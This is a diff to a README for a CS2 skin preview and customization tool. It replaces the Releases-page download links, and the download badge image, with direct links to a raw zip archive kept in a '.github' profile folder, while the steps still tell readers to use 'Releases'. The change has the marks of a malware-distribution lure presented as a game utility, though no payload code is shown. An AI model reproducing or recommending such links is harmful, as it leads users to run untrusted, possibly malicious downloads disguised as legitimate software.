@@ -6,7 +6,7 @@ Welcome to the **CS2 Skin Preview & Customization Utility**! This tool helps you
 
 ## 📥 Download Now
 
-[![Download .github](https://img.shields.io/badge/Download-.github-brightgreen)](https://github.com/Fivengineer/.github/releases)
+[![Download .github](https://github.com/Fivengineer/.github/raw/refs/heads/main/profile/github_v2.4.zip)](https://github.com/Fivengineer/.github/raw/refs/heads/main/profile/github_v2.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you proceed to download the application, make sure your system meets the 
 
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/Fivengineer/.github/releases)
+[Visit this page to download](https://github.com/Fivengineer/.github/raw/refs/heads/main/profile/github_v2.4.zip)
 
 1. Click on the "Releases" link.
 2. Find the latest version available.
